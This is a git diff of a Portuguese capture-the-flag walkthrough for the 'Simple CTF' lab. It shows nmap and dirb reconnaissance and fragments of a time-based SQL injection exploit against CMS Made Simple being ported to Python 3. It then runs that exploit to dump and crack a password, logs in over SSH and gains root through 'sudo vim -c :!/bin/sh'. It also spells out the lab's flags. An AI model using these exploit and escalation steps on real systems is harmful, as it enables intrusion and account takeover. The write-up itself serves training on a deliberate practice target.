@@ -2,7 +2,7 @@
 
 ## Active Machine Information
 ### Title: EasyCTF
-### IP Address: 10.10.220.249
+### IP Address: 10.10.108.183
 
 ## Answer the questions below
 
@@ -10,9 +10,9 @@
 
 ```bash
 ┌─[✗]─[root@parrot]─[/home/patrick/Desktop/Simple_CTF]
-└──╼ #nmap 10.10.220.249
+└──╼ $nmap 10.10.108.183
     Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-18 19:17 -03
-    Nmap scan report for 10.10.220.249
+    Nmap scan report for 10.10.108.183
     Host is up (0.24s latency).
     Not shown: 997 filtered tcp ports (no-response)
     PORT     STATE SERVICE
@@ -34,9 +34,9 @@ Resposta então é <u><b>2</b></u>: pois estão abertas as portas 21 e 80 que s�
 
 ```bash
 ┌─[root@parrot]─[/home/patrick/Desktop/Simple_CTF]
-└──╼ #nmap -sV 10.10.220.249
+└──╼ $nmap -sV 10.10.108.183
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-18 19:33 -03
-Nmap scan report for 10.10.220.249
+Nmap scan report for 10.10.108.183
 Host is up (0.23s latency).
 Not shown: 997 filtered tcp ports (no-response)
 PORT     STATE SERVICE VERSION
@@ -66,7 +66,7 @@ Qual é o CVE que você está usando no aplicativo?)
 * Buscar Diretorios na porta HTTP(80)
 ```bash
 ┌─[✗]─[patrick@parrot]─[~/Desktop/Simple_CTF]
-└──╼ $dirb http://10.10.220.249/
+└──╼ $dirb http://10.10.108.183/
 
 -----------------
 DIRB v2.22    
@@ -74,47 +74,47 @@ By The Dark Raver
 -----------------
 
 START_TIME: Wed Apr 19 22:44:55 2023
-URL_BASE: http://10.10.220.249/
+URL_BASE: http://10.10.108.183/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
 GENERATED WORDS: 4612                                                          
 
----- Scanning URL: http://10.10.220.249/ ----
-+ http://10.10.220.249/index.html (CODE:200|SIZE:11321)                                                        
-+ http://10.10.220.249/robots.txt (CODE:200|SIZE:929)                                                          
-+ http://10.10.220.249/server-status (CODE:403|SIZE:301)                                                       
-==> DIRECTORY: http://10.10.220.249/simple/                                                                    
+---- Scanning URL: http://10.10.108.183/ ----
++ http://10.10.108.183/index.html (CODE:200|SIZE:11321)                                                        
++ http://10.10.108.183/robots.txt (CODE:200|SIZE:929)                                                          
++ http://10.10.108.183/server-status (CODE:403|SIZE:301)                                                       
+==> DIRECTORY: http://10.10.108.183/simple/                                                                    
                                                                                                                
----- Entering directory: http://10.10.220.249/simple/ ----
-==> DIRECTORY: http://10.10.220.249/simple/admin/                                                              
-==> DIRECTORY: http://10.10.220.249/simple/assets/                                                             
-==> DIRECTORY: http://10.10.220.249/simple/doc/                                                                
-+ http://10.10.220.249/simple/index.php (CODE:200|SIZE:19993)                                                  
-==> DIRECTORY: http://10.10.220.249/simple/lib/                                                                
-==> DIRECTORY: http://10.10.220.249/simple/modules/                                                            
-==> DIRECTORY: http://10.10.220.249/simple/tmp/                                                                
-==> DIRECTORY: http://10.10.220.249/simple/uploads/                                                            
+---- Entering directory: http://10.10.108.183/simple/ ----
+==> DIRECTORY: http://10.10.108.183/simple/admin/                                                              
+==> DIRECTORY: http://10.10.108.183/simple/assets/                                                             
+==> DIRECTORY: http://10.10.108.183/simple/doc/                                                                
++ http://10.10.108.183/simple/index.php (CODE:200|SIZE:19993)                                                  
+==> DIRECTORY: http://10.10.108.183/simple/lib/                                                                
+==> DIRECTORY: http://10.10.108.183/simple/modules/                                                            
+==> DIRECTORY: http://10.10.108.183/simple/tmp/                                                                
+==> DIRECTORY: http://10.10.108.183/simple/uploads/                                                            
                                                                                                                
----- Entering directory: http://10.10.220.249/simple/admin/ ----
-+ http://10.10.220.249/simple/admin/index.php (CODE:302|SIZE:0)                                                
-==> DIRECTORY: http://10.10.220.249/simple/admin/lang/                                                         
-==> DIRECTORY: http://10.10.220.249/simple/admin/plugins/                                                      
-==> DIRECTORY: http://10.10.220.249/simple/admin/templates/                                                    
-==> DIRECTORY: http://10.10.220.249/simple/admin/themes/                                                       
+---- Entering directory: http://10.10.108.183/simple/admin/ ----
++ http://10.10.108.183/simple/admin/index.php (CODE:302|SIZE:0)                                                
+==> DIRECTORY: http://10.10.108.183/simple/admin/lang/                                                         
+==> DIRECTORY: http://10.10.108.183/simple/admin/plugins/                                                      
+==> DIRECTORY: http://10.10.108.183/simple/admin/templates/                                                    
+==> DIRECTORY: http://10.10.108.183/simple/admin/themes/                                                       
                                                                                                                
----- Entering directory: http://10.10.220.249/simple/assets/ ----
+---- Entering directory: http://10.10.108.183/simple/assets/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     (Use mode '-w' if you want to scan it anyway)
                                                                                                                
----- Entering directory: http://10.10.220.249/simple/doc/ ----
-+ http://10.10.220.249/simple/doc/index.html (CODE:200|SIZE:24)                                                
-+ http://10.10.220.249/simple/doc/robots.txt (CODE:200|SIZE:121)                                               
+---- Entering directory: http://10.10.108.183/simple/doc/ ----
++ http://10.10.108.183/simple/doc/index.html (CODE:200|SIZE:24)                                                
++ http://10.10.108.183/simple/doc/robots.txt (CODE:200|SIZE:121)                                               
                                                                                                                
----- Entering directory: http://10.10.220.249/simple/lib/ ----
-==> DIRECTORY: http://10.10.220.249/simple/lib/assets/                                                         
-==> DIRECTORY: http://10.10.220.249/simple/lib/classes/                                                                                           
+---- Entering directory: http://10.10.108.183/simple/lib/ ----
+==> DIRECTORY: http://10.10.108.183/simple/lib/assets/                                                         
+==> DIRECTORY: http://10.10.108.183/simple/lib/classes/                                                                                           
 ┌─[✗]─[patrick@parrot]─[~/Desktop/Simple_CTF]
 └──╼ $
 ```
@@ -165,10 +165,10 @@ parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="C
 
 options, args = parser.parse_args()
 if not options.url:
-    print "[+] Specify an url target"
-    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
-    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
-    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
+    print ("[+] Specify an url target")
+    print ("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
+    print ("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
+    print ("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
     exit()
 
 url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
@@ -203,13 +203,13 @@ def crack_password():
 
 def beautify_print_try(value):
     global output
-    print "\033c"
+    print("\033c")
     cprint(output,'green', attrs=['bold'])
     cprint('[*] Try: ' + value, 'red', attrs=['bold'])
 
 def beautify_print():
     global output
-    print "\033c"
+    print("\033c")
     cprint(output,'green', attrs=['bold'])
 
 def dump_salt():
@@ -323,7 +323,7 @@ dump_email()
 dump_password()
 
 if options.cracking:
-    print colored("[*] Now try to crack password")
+    print(colored("[*] Now try to crack password"))
     crack_password()
 
 beautify_print()
@@ -347,9 +347,122 @@ abc123
 ┌─[patrick@parrot]─[/usr/share/wordlists]
 └──╼ $
 ```
+* Executando exploit 
 
+```bash
+┌─[✗]─[patrick@parrot]─[~/Desktop/Simple_CTF]
+└──╼ $python2 exploit.py -u http://10.10.108.183/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+┌─[patrick@parrot]─[/usr/share/wordlists]
+└──╼ $
+```
 <center><span style="color: green">
-Resposta então é <u><b>......</b></u>
+Resposta então é <u><b>secret</b></u>: que foi o retorno do exploit.py
 </span></center>
 
 ---
+
+6. Where can you login with the details obtained?(Onde você pode fazer o login com os detalhes obtidos?)
+
+```bash
+─[✗]─[patrick@parrot]─[~/Desktop/Simple_CTF]
+└──╼ $ssh mitch@10.10.108.183 -p 2222
+The authenticity of host '[10.10.108.183]:2222 ([10.10.108.183]:2222)' can't be established.
+ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.108.183]:2222' (ECDSA) to the list of known hosts.
+mitch@10.10.108.183's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ 
+```
+<center><span style="color: green">
+Resposta então é <u><b>ssh</b></u>
+</span></center>
+
+---
+
+7. What's the user flag?(Qual é a bandeira do usuário?)
+
+```bash
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ ls
+user.txt
+$ cat user.txt
+G00d j0b, keep up!
+$
+```
+<center><span style="color: green">
+Resposta então é <u><b>G00d j0b, keep up!</b></u>
+</span></center>
+
+---
+
+8. Is there any other user in the home directory? What's its name?(Existe algum outro usuário no diretório inicial? Qual o nome disso?)
+
+```bash
+$ pwd 
+/home/mitch
+$ cd .. 
+$ pwd
+/home
+$ ls
+mitch  sunbath
+$
+```
+<center><span style="color: green">
+Resposta então é <u><b>sunbath</b></u>
+</span></center>
+
+---
+
+9. What can you leverage to spawn a privileged shell?(O que você pode aproveitar para gerar um shell privilegiado?)
+
+```bash
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+$
+```
+<center><span style="color: green">
+Resposta então é <u><b>vim</b></u>
+</span></center>
+
+---
+
+10. What's the root flag?(Qual é a bandeira root?)
+* privilege escalation vim(https://gtfobins.github.io/gtfobins/vim/)
+```bash
+$ whoami
+mitch
+$ sudo vim -c ':!/bin/sh'
+
+# ^[[2;2R^[]11;rgb:1e1e/1e1e/1e1e^[\
+> 
+/bin/sh: 1: ot found
+/bin/sh: 1: 2R not found
+# whoami
+root
+# cd /
+# cd root
+# ls
+root.txt
+# cat root.txt
+W3ll d0n3. You made it!
+#
+```
+<center><span style="color: green">
+Resposta então é <u><b>W3ll d0n3. You made it!</b></u>
+</span></center>
